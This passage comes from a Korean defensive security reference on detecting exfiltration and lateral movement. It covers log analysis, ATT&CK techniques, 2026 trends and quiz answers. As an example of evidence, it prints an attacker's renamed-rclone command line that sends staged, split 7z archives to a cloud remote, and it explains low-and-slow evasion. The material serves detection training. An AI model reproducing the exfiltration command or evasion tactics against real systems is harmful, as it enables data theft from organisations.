- **목적지** — 새롭거나 드문 도메인, 갓 등록된 도메인, 개인 클라우드 저장소 계정, 평판 정보가 없는 IP([도메인 신호](../dns/domain-signals.md), [파일, 빈도, 도메인 없는 IP](../http-analysis/files-frequency-naked-ip.md)).
- **양과 방향** — 평범한 웹 사용은 *올리는* 것보다 *내려받는* 게 훨씬 많습니다. 유출은 이걸 뒤집습니다.

```
ts             uid       id.orig_h   id.resp_h     id.resp_p proto service duration  orig_bytes  resp_bytes
1763441245.10  CzQ81e3a  10.20.9.15  198.51.100.77 443       tcp   ssl     1834.22   99614201    48122
```

- `id.orig_h 10.20.9.15` — 프록시(인터넷 쪽 연결은 여기서 시작합니다). 어떤 내부 클라이언트가 요청했는지는 프록시 로그가 알려 줍니다.
- `id.resp_h 198.51.100.77:443` — 외부 목적지.
- `duration 1834.22` — 연결 하나가 약 30분 동안 열려 있었습니다.
- `orig_bytes 99614201` — 약 **95MB를 밖으로 보냄**(≈ 압축 조각 하나), `resp_bytes 48122`(약 47KB 받음)와 비교하면 **업로드:다운로드 = 2,000:1**. 이건 웹 서핑이 아닙니다.
- **시간대** — 비슷한 크기의 업로드가 일정한 간격으로, 또는 늘 밤에(**T1029 Scheduled Transfer**), 매번 크기 기준치 아래로(**T1030 Data Transfer Size Limits**).

!!! tip "[보충] 낮고 느리게(low and slow) — 계산해 보기"
    "천천히"가 왜 통할까요? 40GB를 초당 2MB로 보내면 약 5.7시간이 걸리고, 그 호스트는 어떤 업로드 차트에서든 1등이 됩니다. 같은 40GB를 초당 200KB로 보내면 약 **2.4일**이 걸리지만, 한 시간에 옮기는 양은 약 700MB뿐이라 평범한 백업이나 클라우드 동기화 사이에 숨을 수 있습니다. 그래서 시간당 최고치만이 아니라 호스트별 **며칠에 걸친 누적 업로드**를 지켜볼 가치가 있습니다.

실제로 흔한 모습은 공격자가 정상 **클라우드 동기화·파일 전송 도구**를 쓰는 것입니다(ReliaQuest 등은 Rclone, WinSCP, cURL 같은 도구가 유출에 자주 쓰인다고 보고했습니다). 명령줄이 정체를 드러냅니다.

```
EventID:           4688
NewProcessName:    C:\ProgramData\cache\svhelper.exe
OriginalFileName:  rclone.exe
CommandLine:       svhelper.exe copy C:\ProgramData\cache\ remote01:bkp-2026 --include "upd.7z.*" --bwlimit 200k --transfers 1 --config C:\ProgramData\cache\s.conf
SubjectUserName:   c.ito
```

- `NewProcessName svhelper.exe`인데 `OriginalFileName rclone.exe` — **이름 바꾼** 실행 파일. 원래 이름은 파일의 버전 정보 안에 박혀 있습니다(Sysmon 1이 `OriginalFileName`을 보여 줌). 이름이 안 맞는 것만으로도 위험 신호입니다.
- `copy C:\ProgramData\cache\ remote01:bkp-2026` — 스테이징 폴더를, 설정 파일에 정의된 클라우드 저장소 대상으로 복사.
- `--include "upd.7z.*"` — `7za` 단계에서 만든 압축 조각만.
- `--bwlimit 200k` — **대역폭을 초당 200KB로 제한**. 낮고 느리게를 명령줄에 그대로 적어 둔 겁니다.
- `--transfers 1` — 한 번에 파일 하나씩, 평범한 연결 하나처럼 보이게.
- `--config …\s.conf` — 목적지 계정과 자격 증명이 이 파일에 있습니다. 조사할 때 반드시 수집하세요. 데이터가 **어디로** 갔는지 알려 줍니다.

ATT&CK은 주요 출구에 이름을 붙여 둡니다. **T1041** Exfiltration Over C2 Channel(이미 있는 명령·제어 연결로), **T1048** Exfiltration Over Alternative Protocol(예: FTP, DNS — [DNS 악용](../dns/dns-abuse.md) 참고), **T1567** Exfiltration Over Web Service(예: **.002** 클라우드 저장소로, **.004** 채팅·자동화 서비스 같은 웹훅으로), **T1537** Transfer Data to Cloud Account.

## 엔드포인트 공격 전술 — 섹션 정리 { #summary }

이 섹션 전체를 돌아보면, 침투는 킬 체인(kill chain) 단계를 기준으로 크게 두 부분으로 나뉩니다.

| 단계 | 킬 체인 | 가장 잘 보이는 곳 | 공격자가 하는 일 |
| --- | --- | --- | --- |
| **익스플로잇 이전(pre-exploitation)** | 1 정찰, 2 무기화, 3 전달, 4 익스플로잇 | 주로 **네트워크**(이메일, 웹, 경계) | 표적 찾기, 미끼나 익스플로잇 만들기, 보내기, 코드 실행시키기 |
| **익스플로잇 이후(post-exploitation)** | 5 설치, 6 명령·제어, 7 목표 달성 | 주로 **호스트**(프로세스, 로그온, 파일, 레지스트리 이벤트) | 실행, 지속성, 정보 탐색, 권한 상승, 자격 증명 접근, 옆으로 이동, 수집, 유출 |

ATT&CK은 **익스플로잇 이후** 절반에 집중해서, 그걸 **전술**(<em>왜</em>: 지속성, 옆으로 이동, 유출 …)로 나누고, 전술마다 그걸 이루는 여러 **기법**(<em>어떻게</em>)을 둡니다. 이 매트릭스를 공부하면 무엇을 예상해야 하는지, 그리고 기법마다 어디에 증거가 남는지 함께 알게 됩니다.

탐지가 가장 중요한 건 익스플로잇 이후입니다. 공격자는 이미 안에 있고 목표를 향해 꾸준히 나아가고 있으며, **이 기법들 대부분은 호스트에서만 또렷하게 보입니다**. 네트워크 데이터는 `SRV-APP-07`이 `FS-FIN-02`와 SMB로 이야기했다는 것까지 보여 줍니다. 호스트 데이터는 `c.ito`가 로그온하고, 서비스가 생기고, `robocopy`가 Finance 공유를 훑고, `7za`가 결과를 암호화하는 걸 보여 줍니다. 그래서 다음 섹션은 **엔드포인트 심층 방어(defence in depth)** — 이 흐름의 가능한 한 이른 단계에서 공격자를 잡는 통제와 텔레메트리 — 로 넘어갑니다.

## 2026년 관점 { #trends }

!!! success "[2026 현재] 지금도 그대로 유효"
    이 페이지의 흐름은 지금도 사람이 직접 하는 침투와 랜섬웨어 사례 대부분을 설명합니다. 발판, 자격 증명 도용, **정상 원격 관리 프로토콜**(SMB/원격 서비스, WMI, WinRM, RDP, SSH)을 통한 옆으로 이동, 스테이징 폴더로 수집, 압축, 허용된 길로 유출. 탐지 지점 — 대상 쪽 로그온 + 부모 프로세스, 새 서비스, 공유 접근 몰아치기, 압축 도구 명령줄, 나가는 방향 차단, 업로드 양과 비율 — 도 여전히 옆으로 이동·유출 탐지의 핵심입니다. 나가는 방향 기본 차단과 서버를 인터넷에서 떼어 두는 건 지금도 가장 효과 큰 통제에 속합니다.

!!! info "[변경됨] 바뀐 점"
    - **이제는 데이터 탈취 자체가 목적인 경우가 많습니다.** 랜섬웨어 조직은 점점 데이터를 먼저 훔치고("이중 협박", double extortion), 일부는 암호화를 아예 건너뛰고 훔친 데이터만으로 협박합니다. 2025~2026년 업계 보고(예: Google 위협 인텔리전스)가 이 흐름을 설명합니다. 유출은 더 이상 부수 효과가 아니라, 많은 사건에서 **그 자체가 피해**입니다.
    - **정상 도구와 클라우드 서비스가 기본 출구가 됐습니다.** 공격자는 직접 만든 프로토콜보다 이름 바꾼 동기화·전송 도구(Rclone, WinSCP, cURL 등)와 널리 쓰이는 클라우드 저장소·파일 공유·웹훅 서비스를 선호합니다. 그래서 포트 규칙보다 목적지 허용 목록, 클라우드 앱 통제(CASB), `OriginalFileName`·서명 확인이 더 중요합니다.
    - **옆으로 이동은 클라우드에서도 일어납니다.** 하이브리드 환경에서는 훔친 세션 토큰과 클라우드 관리자 역할로 SMB를 전혀 건드리지 않고 SaaS 앱, 클라우드 콘솔, 온프레미스 시스템 사이를 옮겨 다닙니다(ATT&CK **T1021.007 Cloud Services**, **T1550.001 Application Access Token**). 이제 클라우드 감사 로그(Entra ID 로그인, 통합 감사 로그, 클라우드 추적 로그)도 옆으로 이동 탐지의 일부입니다.
    - **원격 관리 도구.** 상용 원격 접속/RMM 소프트웨어([원격 도구](../other-protocols/remote-tools-summary.md) 참고)가 공격자가 이동하고 통제를 유지하는 가장 흔한 수단 중 하나가 됐습니다(**T1219 Remote Access Tools**). IT 지원처럼 보이고 Windows 로그온 텔레메트리를 비켜 가는 경우가 많습니다.
    - **Windows 기본값이 조여지고 있습니다**(예: Windows 11 24H2와 Windows Server 2025에서 SMB 서명 기본 요구, NTLM 단계적 퇴장). 릴레이와 pass-the-hash는 어려워지지만, 유효한 비밀번호나 티켓을 가진 공격자에게는 장벽이 높아지지 않습니다.

!!! warning "[주의] 옛 방식대로 하면 틀리거나 위험한 점"
    - **옆으로 이동을 네트워크에서만 찾지 마세요.** 암호화된 SMB 3, HTTPS 위의 WinRM, RDP는 내용을 숨깁니다. 증거는 대상 호스트의 4624 + 부모 프로세스 + 7045에 있습니다. **5145**(또는 EDR의 같은 기능)와 명령줄 로깅이 실제로 켜져 있는지 확인하세요. 기본은 꺼져 있습니다.
    - **도구 이름에 기대지 마세요.** `PSEXESVC`, `rclone.exe`, `7z.exe`는 이름을 쉽게 바꿉니다. **모양**을 탐지하세요. `ADMIN$`에 방금 써진 파일로 만든 새 SYSTEM 서비스, 셸을 띄우는 `WmiPrvSE.exe`, `OriginalFileName` 불일치, 머리글 암호화와 분할 옵션으로 만든 압축 파일.
    - **"허용된 트래픽"을 안전하다고 보지 마세요.** 실제 유출 대부분은 프록시를 거쳐 443으로, 평판 좋은 클라우드 서비스로 갑니다. 호스트별 업로드 양·비율·목적지를 **며칠 단위로** 보고, 내부 서버가 인터넷에 직접 닿으려 하면 무조건 경보를 거세요.
    - **무엇이 털렸는지 전체 패킷 캡처가 알려 줄 거라 믿지 마세요.** 데이터는 암호화돼 있을 겁니다. 정리하기 전에 엔드포인트(명령줄, 스테이징 폴더, 압축 도구 설정 파일)를 보존하세요. 답은 거기 있고, 그게 침해 신고 의무를 좌우할 수도 있습니다.

## 확인 문제 { #quiz }

### 문제 1

`FS-FIN-02`에서 10초 안에 다음이 보입니다. `10.20.4.37`에서 NTLM을 쓴 `c.ito`의 4624 유형 3, `ShareName \\*\ADMIN$`·`RelativeTargetName svcupd.exe`·`AccessMask 0x2`인 5145, 그리고 이미지가 `%SystemRoot%\svcupd.exe`이고 요청 시작·LocalSystem인 새 서비스 `svcupd`의 7045. 무슨 일이 일어났고, 어떤 ATT&CK 기법에 해당하며, 다음에 무엇을 확인하겠습니까?

??? success "정답과 해설"
    **PsExec 방식의 옆으로 이동**입니다. 누군가 `c.ito`로 네트워크 로그온을 하고(4624 유형 3), **숨겨진 관리 공유를 통해 `C:\Windows`에 실행 파일을 썼고**(5145, `ADMIN$`에 `WriteData`), 그 파일을 가리키는 **SYSTEM으로 도는 요청 시작형 서비스를 만들었습니다**(7045). 기법: **T1021.002** SMB/Windows Admin Shares, **T1569.002** Service Execution, **T1570** Lateral Tool Transfer, 그리고 **T1078** Valid Accounts(pass-the-hash라면 T1550.002 — NTLM 패키지가 그 의심을 뒷받침합니다).

    다음: 4688/Sysmon 1에서 `services.exe` → `svcupd.exe` → 자식 프로세스를 따라가 무엇이 돌았는지 봅니다. `svcupd.exe`의 해시를 뜨고 수집합니다. 출발지 `10.20.4.37`(`SRV-APP-07`)로 넘어가 `c.ito`를 어떻게 얻었는지(거기서의 자격 증명 덤프) 찾습니다. 모든 호스트에서 그 출발지의 다른 4624와 다른 새 서비스를 찾습니다. `c.ito`를 뚫린 계정으로 보고 비밀번호를 바꿉니다.

### 문제 2

공격자가 유출 전에 데이터를 보통 압축·암호화·조각내는 이유는 무엇이고, 그게 SOC에게 어떤 의미인가요?

??? success "정답과 해설"
    **압축**은 옮길 바이트 수를 줄입니다. **조각내기**(예: 95MB씩)는 거대한 전송 한 번 대신 작은 조각을 천천히 보내서, 업로드 크기와 "상위 전송자" 기준치 아래에 머물게 해 줍니다. **암호화**(머리글 암호화까지 하면 파일 이름도)는 SOC가 트래픽을 잡아도 무엇을 가져갔는지 못 보게 합니다.

    SOC에게는: 내용 검사와 패킷 캡처로는 무엇이 털렸는지 알 수 없으니 **명령줄 포함 프로세스 생성 로그**가 결정적이 됩니다. 압축 도구의 명령줄은 입력 폴더를 보여 주고, 비밀번호가 들어 있을 수도 있습니다. 조사관은 스테이징 폴더, 압축 조각, 도구 설정 파일을 보존해야 합니다. 탐지는 **행동**으로 옮겨 갑니다. 이상한 폴더에서 낯선 도구로 만든 압축 파일, 스테이징 호스트로의 큰 내부 복사, 그리고 나가는 업로드의 양·비율·시간대·목적지.

### 문제 3

경계 방화벽이 나가는 방향 기본 차단이고, 메일 서버만 25번, 웹 프록시만 80/443번을 쓸 수 있습니다. 한 분석가가 "그러니 여기선 유출이 불가능하다"고 말합니다. 무엇이 틀렸고, 무엇을 지켜봐야 하나요?

??? success "정답과 해설"
    나가는 방향 기본 차단은 직접 나가는 길 대부분을 없애고 공격자를 좁고 감시되는 길로 몰아넣습니다. 큰 이득이지만 유출을 막지는 못합니다. 공격자는 여느 사용자처럼 **프록시를 거친 HTTPS**로(클라우드 저장소, 파일 공유 사이트, 웹훅으로) 데이터를 보낼 수 있고, **이미 있는 C2 채널**을 쓰거나, 내부 DNS 서버가 인터넷으로 질의를 넘긴다면 **DNS**를 악용할 수도 있습니다. 허용된 포트에서 원래 프로토콜을 쓰면 포트 기반 규칙은 무력합니다.

    지켜볼 것: **나가는 방향 차단 로그**, 특히 내부 서버에서 나온 것(누군가 출구를 더듬는 이른 신호). 프록시와 흐름 데이터에서 호스트별로 며칠에 걸친 **업로드 양, 업로드/다운로드 비율, 오래 열린 연결, 규칙적인 시간대**. **새롭거나 드문 목적지**와 개인 클라우드 저장소 계정. DNS 터널링 패턴. 그리고 엔드포인트에서 **이름 바꾼 전송 도구**(`OriginalFileName` 불일치), 비밀번호·분할 옵션을 쓴 압축 도구, 스테이징 폴더로의 큰 내부 복사.

## 관련 레퍼런스 { #related }

- [자격 증명 덤프와 Mimikatz](credential-dumping-mimikatz.md) — 옆으로 이동의 연료가 되는 단계 · [권한 상승](privilege-escalation.md)
- [SMB를 통한 PsExec](../../../adversary/psexec-smb.md) · [WMI와 WinRM](../../../adversary/wmi-winrm.md) · [RDP](../../../adversary/rdp.md) · [Pass-the-Hash](../../../adversary/pass-the-hash.md)
- [SMB](../other-protocols/smb.md) · [SSH, RDP, VNC](../other-protocols/ssh-rdp-vnc.md) · [PowerShell 원격, FTP, ICMP](../other-protocols/psremoting-ftp-icmp.md) · [원격 도구](../other-protocols/remote-tools-summary.md) — 네트워크 쪽 모습
- [DNS 악용](../dns/dns-abuse.md) — DNS를 통한 터널링과 유출
- [Windows 이벤트 ID](../../../basics/windows-event-ids.md)
